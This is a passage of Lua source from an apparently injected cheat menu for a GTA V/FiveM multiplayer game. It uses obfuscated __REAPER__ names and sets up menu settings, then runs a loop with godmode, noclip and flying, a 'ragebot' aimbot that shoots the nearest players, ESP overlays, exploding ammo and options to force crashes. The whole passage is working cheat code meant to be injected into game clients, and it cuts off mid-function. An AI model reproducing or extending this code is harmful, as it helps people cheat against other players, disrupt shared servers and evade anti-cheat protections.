            {text = 'Banner', dkey = 'settings_banner', desc = 'Type in a image link for the menu\nbanner.', afu = __REAPER1__.M.settings.banner, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Image link', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Font', dkey = 'settings_font', desc = 'Set the menu font.', option = __REAPER1__.M.Combo, cindex = 4, sindex = 4, textboxtext = 'Menu font number', length = 1, tipus = 'szam', func = {1, 2, 3, 4, 5, 6, 7, 8}},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Force quit', dkey = 'settings_forcequit', desc = 'Force quit the game.', afu = __REAPER1__.M.settings.forcequit, option = __REAPER1__.M.Button},
            {text = 'Force crash', dkey = 'settings_forcecrast', desc = 'Force crash your game with a specific\ncrash type. 1 and 2 are regular crashes, 3 and 4 are freezes.', afu = __REAPER1__.M.settings.forcecrash, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Crash type', length = 1, tipus = 'szam', func = {1, 2, 3, 4}},
            {text = 'Injection time', dkey = 'settings_injectiontime', desc = 'The time you injected the menu.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Don\'t even try haha', length = 1, tipus = 'szam', func = ''},
        },

        ['settings:configs'] = {
            {text = 'Save', dkey = 'settings:configs_save', desc = 'Save your current config.', afu = __REAPER1__.M.settings.config.save, option = __REAPER1__.M.Button},
            {text = 'Auto load', dkey = 'settings:configs_autoload', desc = 'Auto load a config based on the name.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Config name', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Load', dkey = 'settings:configs_load', desc = 'Load someone\'s config based on\nthe config name. It won\'t automatically\nupdate.', afu = __REAPER1__.M.settings.config.load, option = __REAPER1__.M.Button},
        },

        ['settings:language'] = {
            {text = 'English', dkey = 'settings:language_english', desc = 'Set the english language for the menu.', afu = __REAPER1__.M.settings.language.language, option = __REAPER1__.M.Button, extra = 'english'},
        },

        ['searchopt'] = {
        },
    }

    for _k,_v in pairs(__REAPER1__.T.Display) do
        for k,v in ipairs(_v) do
            if v.dkey then
                __REAPER1__.A[v.dkey] = v
            end
        end
    end

    __REAPER1__.M.MenuRequest = function(tipus, cMenu)
        cMenu = cMenu or __REAPER1__.A[__REAPER1__.M.CurrentMenu]
        if tipus == 'set' then
            cMenu.lasto = __REAPER1__.M.SelectedOption
            cMenu.scrollo = __REAPER1__.M.ScrollOption
            cMenu.addedo = __REAPER1__.M.AddedOptions
        elseif __REAPER1__.A['settings_lastoption'].func then
            if not __REAPER1__.M.CursorHovering then
                __REAPER1__.M.SelectedOption = cMenu.lasto
                __REAPER1__.M.ScrollOption = cMenu.scrollo
            end
            __REAPER1__.M.AddedOptions = cMenu.addedo
        else
            __REAPER1__.M.SelectedOption = 1
            __REAPER1__.M.ScrollOption = 0
            __REAPER1__.M.AddedOptions = 0
        end
    end

    __REAPER25__(function()
        __REAPER1__.M.ActiveTick = true
        while __REAPER1__.M.ActiveTick do __REAPER26__(0)
            if not __REAPER1__ then return end

            if __REAPER1__.M.Initialized then
                if __REAPER1__.N.IsKeyReleased(__REAPER1__.A['settings_menu'].extra) and not __REAPER1__.M.MenuAlphaBusy then
                    if __REAPER1__.M.CurrentMenu then
                        __REAPER1__.M.MenuRequest('set')
                        __REAPER1__.M.LastMenu = __REAPER1__.M.CurrentMenu
                        __REAPER1__.F.CloseMenu()
                    else
                        __REAPER1__.M.CurrentMenu = __REAPER1__.M.LastMenu
                        __REAPER1__.M.MenuRequest('request')
                        __REAPER1__.F.OpenMenu()
                    end
                elseif __REAPER1__.N.IsKeyPressed(__REAPER1__.A['settings_menu'].extra) then
                    __REAPER1__.M.DestroyTime = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_destroytimer'].sindex
                elseif __REAPER1__.N.IsKeyHeld(__REAPER1__.A['settings_menu'].extra) and __REAPER1__.M.DestroyTime then
                    if __REAPER1__.M.DestroyTime <= __REAPER1__.N.GetGameTimer() then
                        __REAPER1__.M.settings.destroy()
                    end
                end
            end

            local _, err = pcall(function()
                if __REAPER1__.V.SelfPed ~= __REAPER1__.N.PedId() and __REAPER1__.N.IsModelValid(__REAPER1__.N.GetEntityModel(__REAPER1__.N.PedId())) then
                    __REAPER1__.V.SelfPed = __REAPER1__.N.PedId()

                    __REAPER1__.F.RequestSkin(0, 'player:skin_hat', 'player:skin_vhat', 'prop')
                    __REAPER1__.F.RequestSkin(1, 'player:skin_glass', 'player:skin_vglass', 'prop')
                    __REAPER1__.F.RequestSkin(2, 'player:skin_ear', 'player:skin_vear', 'prop')
                    __REAPER1__.F.RequestSkin(6, 'player:skin_watch', 'player:skin_vwatch', 'prop')
                    __REAPER1__.F.RequestSkin(7, 'player:skin_bracelet', 'player:skin_vbracelet', 'prop')

                    __REAPER1__.F.RequestSkin(0, 'player:skin_face', 'player:skin_vface')
                    __REAPER1__.F.RequestSkin(1, 'player:skin_mask', 'player:skin_vmask')
                    __REAPER1__.F.RequestSkin(2, 'player:skin_hair', 'player:skin_vhair')
                    __REAPER1__.F.RequestSkin(3, 'player:skin_torso', 'player:skin_vtorso')
                    __REAPER1__.F.RequestSkin(4, 'player:skin_leg', 'player:skin_vleg')
                    __REAPER1__.F.RequestSkin(5, 'player:skin_parachute', 'player:skin_vparachute')
                    __REAPER1__.F.RequestSkin(6, 'player:skin_shoe', 'player:skin_vshoe')
                    __REAPER1__.F.RequestSkin(7, 'player:skin_accessory', 'player:skin_vaccessory')
                    __REAPER1__.F.RequestSkin(8, 'player:skin_undershirt', 'player:skin_vundershirt')
                    __REAPER1__.F.RequestSkin(9, 'player:skin_kevlar', 'player:skin_vkevlar')
                    __REAPER1__.F.RequestSkin(10, 'player:skin_badge', 'player:skin_vbadge')
                    __REAPER1__.F.RequestSkin(11, 'player:skin_torso2', 'player:skin_vtorso2')
                end

                if __REAPER1__.V.CurrentVehicle ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed, __REAPER1__.A['vehicle_lastvehicle'].func) then
                    __REAPER1__.V.CurrentVehicle = __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed, __REAPER1__.A['vehicle_lastvehicle'].func)
                end

                if __REAPER1__.A['player_infinitestamine'].func and __REAPER1__.N.GetPlayerSprintStaminaRemaining(__REAPER1__.V.SelfPlayerId) > 0 then
                    __REAPER1__.N.ResetPlayerStamina(__REAPER1__.V.SelfPlayerId)
                end

                if __REAPER1__.A['player_ragdoll'].func then
                    __REAPER1__.N.SetPedToRagdoll(__REAPER1__.V.SelfPed, 1000, 1000, 0, 0, 0, 0)
                end

                if __REAPER1__.A['player_disabledrowning'].func then
                    __REAPER1__.N.SetPedDiesInWater(__REAPER1__.V.SelfPed, false)
                end

                if __REAPER1__.A['player_disableheadshot'].func then
                    __REAPER1__.N.SetPedSuffersCriticalHits(__REAPER1__.V.SelfPed, false)
                end

                if __REAPER1__.A['player_tazetime'].func ~= 'Default' then
                    __REAPER1__.N.SetPedMinGroundTimeForStungun(__REAPER1__.V.SelfPed, tonumber(__REAPER1__.A['player_tazetime'].func))
                end

                if __REAPER1__.A['player_healthrecharge'].sindex ~= 1 then
                    __REAPER1__.N.SetPlayerHealthRechargeMultiplier(__REAPER1__.V.SelfPlayerId, __REAPER1__.A['player_healthrecharge'].func[__REAPER1__.A['player_healthrecharge'].sindex])
                end

                if __REAPER1__.A['player:movement_automovement'].func then
                    if __REAPER1__.N.IsPedOnFoot(__REAPER1__.V.SelfPed) then
                        if not __REAPER1__.V.Automove then
                            local coords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0.0, -3.0, 0.0)
                            __REAPER1__.V.AutomoveCoords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                            __REAPER1__.N.TaskSmartFleeCoord(__REAPER1__.V.SelfPed, coords, 10000.0, 1000000, true, true)
                            __REAPER1__.N.SetPedFleeAttributes(__REAPER1__.V.SelfPed, 65536, false)
                            __REAPER1__.N.SetPedHearingRange(__REAPER1__.V.SelfPed, 0.0)
                            __REAPER1__.N.SetPedSeeingRange(__REAPER1__.V.SelfPed, 0.0)
                            __REAPER1__.V.Automove = true
                        end
                    elseif __REAPER1__.V.Automove then
                        __REAPER1__.V.Automove = false
                    end

                    if __REAPER1__.V.Automove then
                        local coords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0.0, -3.0, 0.0)
                        if math.random(0, 1000) > 990 and not __REAPER1__.N.IsPedWalking(__REAPER1__.V.SelfPed) and not __REAPER1__.N.IsPedJumping(__REAPER1__.V.SelfPed) and #(__REAPER1__.V.AutomoveCoords - coords) > 250 then
                            __REAPER1__.V.AutomoveCoords = coords
                            __REAPER1__.N.TaskWanderStandard(__REAPER1__.V.SelfPed, 10.0, 10)
                            local randomszam = math.random(0, 4)
                            __REAPER25__(function()
                                if randomszam == 3 and __REAPER1__.A['player:movement_automovement'].func and not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, false) then
                                    __REAPER1__.N.TaskJump(__REAPER1__.V.SelfPed, false, false)
                                    __REAPER26__(2000)
                                elseif randomszam == 4 and __REAPER1__.A['player:movement_automovement'].func and not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, false) then
                                    __REAPER1__.N.TaskJump(__REAPER1__.V.SelfPed, false, false)
                                    __REAPER26__(2000)
                                    if not __REAPER1__.A['player:movement_automovement'].func then return end;
                                    __REAPER1__.N.TaskWanderStandard(__REAPER1__.V.SelfPed, 10.0, 10)
                                    __REAPER26__(math.random(3000, 8000))
                                    if not __REAPER1__.A['player:movement_automovement'].func then return end;
                                    __REAPER1__.N.TaskJump(__REAPER1__.V.SelfPed, false, false)
                                    __REAPER26__(2000)
                                end
                                if  __REAPER1__.A['player:movement_automovement'].func and not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, false) then
                                    __REAPER1__.N.TaskWanderStandard(__REAPER1__.V.SelfPed, 10.0, 10)
                                    __REAPER26__(math.random(10000, 25000))
                                    if not __REAPER1__.N.IsPedFleeing(__REAPER1__.V.SelfPed) and __REAPER1__.A['player:movement_automovement'].func and not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, false) then
                                        __REAPER1__.N.TaskSmartFleeCoord(__REAPER1__.V.SelfPed, coords, 10000.0, 1000000, true, true)
                                    end
                                end
                            end)
                        end
                    end
                end

                if __REAPER1__.A['player:movement_infinitejumps'].func and __REAPER1__.N.IsDisabledControlJustPressed(0, 143) then
                    __REAPER1__.N.TaskJump(__REAPER1__.V.SelfPed, false, false)
                end

                if __REAPER1__.A['player:movement_fastmovement'].func then
                    __REAPER1__.N.SetPedMoveRateOverride(__REAPER1__.V.SelfPed, 10.0)
                end

                if __REAPER1__.A['player:movement_superjump'].func then
                    __REAPER1__.N.SetSuperJumpThisFrame(__REAPER1__.V.SelfPlayerId)
                end

                if __REAPER1__.A['player:movement_beastjump'].func and __REAPER1__.N.IsDisabledControlJustPressed(0, 143) then
                    __REAPER1__.N.TaskJump(__REAPER1__.V.SelfPed, false, true, true)
                end

                if __REAPER1__.A['player:movement_flying'].func and not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, true) then
                    local pedCoords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local flyingspeed = not __REAPER1__.A['player:movement_wlagging'].func and __REAPER1__.A['player:movement_wspeed'].sindex / 10 or __REAPER1__.A['player:movement_wspeed'].sindex
                    local gameplayCamRot = __REAPER1__.N.GetGameplayCamRot(0)

                    if __REAPER1__.N.IsDisabledControlPressed(0, 21) then
                        flyingspeed = flyingspeed * 3
                    elseif __REAPER1__.N.IsDisabledControlPressed(0, 36) then
                        flyingspeed = flyingspeed / 3
                    end

                    local forward, right = __REAPER1__.M.RotToQuat(gameplayCamRot) * vector3(0.0, 1.0, 0.0), __REAPER1__.M.RotToQuat(gameplayCamRot) * vector3(1.0, 0.0, 0.0)

                    if __REAPER1__.N.IsDisabledControlPressed(0, 32) then
                        __REAPER1__.V.WalkingNoclipKey = true
                        pedCoords = pedCoords + forward * flyingspeed
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 33) then
                        __REAPER1__.V.WalkingNoclipKey = true
                        pedCoords = pedCoords + forward * - flyingspeed
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 30) then
                        __REAPER1__.V.WalkingNoclipKey = true
                        pedCoords = pedCoords + right * flyingspeed
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 34) then
                        __REAPER1__.V.WalkingNoclipKey = true
                        pedCoords = pedCoords + right * - flyingspeed
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 22) then
                        __REAPER1__.V.WalkingNoclipKey = true
                        pedCoords = vector3(pedCoords.x, pedCoords.y, pedCoords.z + flyingspeed)
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 38) then
                        __REAPER1__.V.WalkingNoclipKey = true
                        pedCoords = vector3(pedCoords.x, pedCoords.y, pedCoords.z - flyingspeed)
                    end

                    if __REAPER1__.V.WalkingNoclipKey and __REAPER1__.A['player:movement_wlagging'].func and __REAPER1__.V.WalkingNoclipTimer <= __REAPER1__.N.GetGameTimer() or __REAPER1__.V.WalkingNoclipKey and not __REAPER1__.A['player:movement_wlagging'].func then
                        if __REAPER1__.A['player:movement_wlagging'].func then
                            __REAPER1__.V.WalkingNoclipTimer = __REAPER1__.N.GetGameTimer() + 200
                        end
                        __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                    end
                    local coords = vector3(gameplayCamRot.x - __REAPER1__.N.GetDisabledControlNormal(0, 2) * 10, gameplayCamRot.y, gameplayCamRot.z - __REAPER1__.N.GetDisabledControlNormal(0, 1) * 10)
                    __REAPER1__.N.SetEntityRotation(__REAPER1__.V.SelfPed, coords, 0)

                    if __REAPER1__.A['player:movement_wextra'].sindex == 3 or __REAPER1__.A['player:movement_wextra'].sindex == 4 then
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.SelfPed, 69101.120)
                    end

                    __REAPER1__.V.WalkingNoclipKey = false
                end

                if __REAPER1__.A['player:movement_noclip'].func and not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, true) then
                    __REAPER1__.N.TaskSkyDive(__REAPER1__.V.SelfPed)
                    local pedCoords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local noclipSpeed = not __REAPER1__.A['player:movement_nlagging'].func and __REAPER1__.A['player:movement_nspeed'].sindex / 10 or __REAPER1__.F.IntToFloat(__REAPER1__.A['player:movement_nspeed'].sindex)

                    __REAPER1__.N.DisableControlAction(0, 85, true)
                    __REAPER1__.N.DisableControlAction(0, 38, true)

                    if __REAPER1__.N.IsDisabledControlPressed(0, 21) then
                        noclipSpeed = noclipSpeed * 3
                    elseif __REAPER1__.N.IsDisabledControlPressed(0, 36) then
                        noclipSpeed = noclipSpeed / 3
                    end

                    if __REAPER1__.N.IsDisabledControlPressed(1, 34) then
                        __REAPER1__.N.SetEntityHeading(__REAPER1__.V.SelfPed, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed) + 3.0)
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(1, 9) then
                        __REAPER1__.N.SetEntityHeading(__REAPER1__.V.SelfPed, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed) - 3.0)
                    end

                    if not __REAPER1__.A['player:movement_nlagging'].func or __REAPER1__.V.NoclipTimer <= __REAPER1__.N.GetGameTimer() then
                        if __REAPER1__.A['player:movement_nlagging'].func then
                            __REAPER1__.V.NoclipTimer = __REAPER1__.N.GetGameTimer() + 200
                        end
                        if __REAPER1__.N.IsDisabledControlPressed(1, 8) then
                            pedCoords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0.0, noclipSpeed, 0.0)
                        end
                        if __REAPER1__.N.IsDisabledControlPressed(1, 32) then
                            pedCoords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0.0, - noclipSpeed, 0.0) 
                        end
                        if __REAPER1__.N.IsDisabledControlPressed(1, 38) then
                            pedCoords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0.0, 0.0, noclipSpeed)
                        end
                        if __REAPER1__.N.IsDisabledControlPressed(1, 44)then
                            pedCoords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0.0, 0.0, - noclipSpeed)
                        end
                    end

                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, pedCoords, false, false, false)

                    if __REAPER1__.A['player:movement_nextra'].sindex == 3 or __REAPER1__.A['player:movement_nextra'].sindex == 4 then
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.SelfPed, 69101.120)
                    end
                end

                if __REAPER1__.A['player:godmode_securegod'].func then
                    __REAPER1__.N.ReaperGod(__REAPER1__.V.SelfPed, 69101.120)
                end

                if __REAPER1__.A['player:godmode_force'].toggle then
                    if __REAPER1__.A['player:godmode_force'].sindex == 1 then
                        __REAPER1__.N.SetEntityHealth(__REAPER1__.V.SelfPed, __REAPER1__.A['player:godmode_forcevalue'].func)
                    elseif __REAPER1__.A['player:godmode_force'].sindex == 2 then
                        __REAPER1__.N.SetPedArmour(__REAPER1__.V.SelfPed, __REAPER1__.A['player:godmode_forcevalue'].func)
                    elseif __REAPER1__.A['player:godmode_force'].sindex == 3 then
                        __REAPER1__.N.SetEntityHealth(__REAPER1__.V.SelfPed, __REAPER1__.A['player:godmode_forcevalue'].func)
                        __REAPER1__.N.SetPedArmour(__REAPER1__.V.SelfPed, __REAPER1__.A['player:godmode_forcevalue'].func)
                    end
                end

                if __REAPER1__.A['player:superpower_ghostmode'].func then
                    __REAPER1__.N.GhostMode(__REAPER1__.V.SelfPed, true)
                end

                if __REAPER1__.A['player:superpower_nogravity'].func then
                    __REAPER1__.N.SetEntityHasGravity(__REAPER1__.V.SelfPed, false)
                end

                if __REAPER1__.A['player:superpower_walkonwater'].func and __REAPER1__.V.CurrentVehicle == 0 or __REAPER1__.A['vehicle_driveonwater'].func and __REAPER1__.V.CurrentVehicle ~= 0 then
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(`bkr_prop_biker_bblock_sml3`) then
                            local coords = __REAPER1__.V.CurrentVehicle ~= 0 and __REAPER1__.A['vehicle_driveonwater'].func and __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed, false)) or __REAPER1__.V.CurrentVehicle == 0 and __REAPER1__.A['player:superpower_walkonwater'].func and __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                            local inWater, waterHeight = __REAPER1__.N.GetWaterHeight(coords.x, coords.y, coords.z)
                            local dist = #(vector3(coords.x, coords.y, waterHeight) - coords)

                            if not __REAPER1__.N.IsEntityInWater(__REAPER1__.V.SelfPed) and dist < 3.0 and #(coords - __REAPER1__.N.GetEntityCoords(__REAPER1__.V.WaterObject)) > 1.5 then
                                __REAPER1__.N.DeleteEntity(__REAPER1__.V.WaterObject)
                                __REAPER1__.V.WaterObject = __REAPER1__.N.CreateObject(`bkr_prop_biker_bblock_sml3`, coords.x, coords.y, waterHeight - 0.9, true, false, false)
                                __REAPER1__.N.SetEntityVisible(__REAPER1__.V.WaterObject, false, 0)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.V.WaterObject, 0, 0.0, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed) - 90.0, 1, true)
                            elseif __REAPER1__.N.IsEntityInWater(__REAPER1__.V.SelfPed) then
                                __REAPER1__.N.DeleteEntity(__REAPER1__.V.WaterObject)
                                __REAPER1__.V.WaterObject = __REAPER1__.N.CreateObject(`bkr_prop_biker_bblock_sml3`, coords.x, coords.y, coords.z - 1.7, true, false, false)
                                __REAPER1__.N.SetEntityVisible(__REAPER1__.V.WaterObject, false, 0)
                            elseif __REAPER1__.N.DoesEntityExist(__REAPER1__.V.WaterObject) and dist > 4.0 then
                                __REAPER1__.N.DeleteEntity(__REAPER1__.V.WaterObject)
                                __REAPER1__.V.WaterObject = nil
                            end
                        end
                    end)
                end

                if  __REAPER1__.A['player:particle_loopparticle'].func and __REAPER1__.V.ParticleDelay and __REAPER1__.V.ParticleDelay <= __REAPER1__.N.GetGameTimer() then
                    __REAPER1__.V.ParticleDelay = __REAPER1__.N.GetGameTimer()
                    __REAPER1__.M.player.particle.playparticle()
                end

                if __REAPER1__.A['player:forcefield_drawindicator'].func then
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local radius = __REAPER1__.F.IntToFloat(__REAPER1__.A['player:forcefield_range'].sindex)
                    local r, g, b, a = __REAPER1__.F.TableToColor(__REAPER1__.A['player:forcefield_rangecolor'].menuextra)
                    __REAPER1__.N.DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, r, g, b, a, false, true, 2, nil, nil, false)
                end

                if __REAPER1__.A['weapon:ammo_firebullets'].func then
                    local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if ret then
                        __REAPER25__(function()
                            __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                            __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                            __REAPER26__(500)
                            __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                            __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                            __REAPER26__(500)
                            __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                            __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                        end)
                    end
                end

                if __REAPER1__.A['weapon:ammo_modifyammo'].toggle then
                    local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if ret then
                        __REAPER25__(function()
                            local weapon = __REAPER1__.N.GetHashKey(__REAPER1__.T.ModyAmmoGuns[__REAPER1__.A['weapon:ammo_modifyammo'].sindex])
                            if __REAPER1__.F.RequestWeaponAsset(__REAPER1__.A['weapon:ammo_modifyammo'].sindex == 1 and `WEAPON_RPG` or __REAPER1__.A['weapon:ammo_modifyammo'].sindex == 2 and `WEAPON_RPG` or weapon) then
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(__REAPER1__.N.WeaponCoords(__REAPER1__.V.SelfPed), coords, 0.0, true, weapon, __REAPER1__.V.SelfPed, false, true, 500.0)
                            end
                        end)
                    end
                end

                if __REAPER1__.A['weapon:ammo_particleammo'].toggle then
                    local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if ret then
                        __REAPER1__.N.DoParticle(__REAPER1__.T.ParticleAmmoParticles[__REAPER1__.A['weapon:ammo_particleammo'].sindex].dict, __REAPER1__.T.ParticleAmmoParticles[__REAPER1__.A['weapon:ammo_particleammo'].sindex].name, coords.x, coords.y, coords.z, 1.0, 0, 0, 0, 0, 0, 0)
                    end
                end

                if __REAPER1__.A['weapon:ammo_slingshotgun'].func then
                    local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if ret then
                        __REAPER1__.N.ApplyForceToEntity(__REAPER1__.V.SelfPed, 3, __REAPER1__.N.GetEntityForwardVector(__REAPER1__.V.SelfPed) * 100, 0, 0, 0, false, false, true, true, false, true)
                    end
                end

                if __REAPER1__.A['combat_hitmarker'].func or __REAPER1__.A['combat_hitsound'].func then
                    __REAPER1__.V.CombRet, __REAPER1__.V.CombCoords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                end

                if __REAPER1__.A['combat:ragebot_ragebot'].func and (__REAPER1__.A['combat:ragebot_onkey'].toggle and __REAPER1__.N.IsDisabledControlPressed(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['combat:ragebot_onkey'].func[__REAPER1__.A['combat:ragebot_onkey'].sindex]]) or not __REAPER1__.A['combat:ragebot_onkey'].toggle) then
                    local target = __REAPER1__.F.ClosestEntity(__REAPER1__.A['combat:ragebot_onlyplayers'].func and 'player' or 'ped', false, 'ragebot', bone)
                    if target then
                        if __REAPER1__.V.RPrevPos then
                            __REAPER1__.V.RCurrPos = __REAPER1__.N.GetPedBoneCoords(target, 31086)
                            __REAPER1__.V.RDiffDelta = __REAPER1__.V.RCurrPos - __REAPER1__.V.RPrevPos
                            __REAPER1__.V.RPredDist = #(__REAPER1__.V.RCurrPos - __REAPER1__.V.RPrevPos)
                            __REAPER1__.V.RBonePos = (__REAPER1__.V.RCurrPos + __REAPER1__.V.RDiffDelta)
                            __REAPER1__.V.RPrevPos = __REAPER1__.N.GetPedBoneCoords(target, 31086)
                        else
                            __REAPER1__.V.RPrevPos = __REAPER1__.N.GetPedBoneCoords(target, 31086)
                            __REAPER1__.V.RBonePos = __REAPER1__.V.RPrevPos
                        end

                        local hash = __REAPER1__.N.GetHashKey('weapon_' .. __REAPER1__.A['combat:ragebot_weapon'].func[__REAPER1__.A['combat:ragebot_weapon'].sindex])

                        __REAPER25__(function()
                            if __REAPER1__.F.RequestWeaponAsset(hash) then
                                local predOffs = __REAPER1__.V.RPredDist >= 10 and 10 or __REAPER1__.V.RPredDist <= 0.13 and 0.13 or __REAPER1__.V.RPredDist
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(__REAPER1__.V.RBonePos.x, __REAPER1__.V.RBonePos.y - predOffs, __REAPER1__.V.RBonePos.z, __REAPER1__.V.RBonePos, 10000, true, hash, __REAPER1__.V.SelfPed, false, true, 100000000.0)
                            end
                        end)

                        if __REAPER1__.A['combat:visuals_targettrace'].func then
                            local r, g, b, a = __REAPER1__.F.Color('combat:visuals_tcolortype', 'combat:visuals_tcolor')
                            local c, tc = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.N.GetEntityCoords(target)
                            __REAPER1__.N.DrawLine(c.x, c.y, c.z, __REAPER1__.V.RPrevPos.x, __REAPER1__.V.RPrevPos.y, __REAPER1__.V.RPrevPos.z, r, g, b, a)
                        end
                    end
                end

                if __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 1 or
                __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 1 or
                __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 1 or
                __REAPER1__.A['visuals:glow_glow'].func and __REAPER1__.A['visuals:glow_target'].sindex == 1 or
                __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 1 or
                __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 1 or
                __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 1 or
                __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 1 or
                __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 1 or
                __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 1 or
                __REAPER1__.A['visuals:skeletonesp_skeletonesp'].func and __REAPER1__.A['visuals:skeletonesp_target'].sindex == 1 then
                    local coords = __REAPER1__.A['misc:freecam_freecam'].func and __REAPER1__.V.FreecamC or __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local rcoords, v = __REAPER1__.M.RayCastGameplayCamera(400.0)
                    if v then
                        local tcoords = __REAPER1__.N.GetEntityCoords(v)
                        local tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = nil, nil, nil, nil, nil, nil, nil, nil
                        local sx, sy, w, y, w2, y2 = nil, nil, nil, nil, nil, nil
                        local boundingcheck = __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 1 or __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 1

                        if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 1 or __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 1 or __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 1 or __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 1 then
                            tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v, boundingcheck and 'cock' or 'min')
                            sx, sy, w, y, w2, y2 = __REAPER1__.F.Entity2dDimensions(tcoords, tfr, bbl, tfl, bbr)
                        elseif boundingcheck then
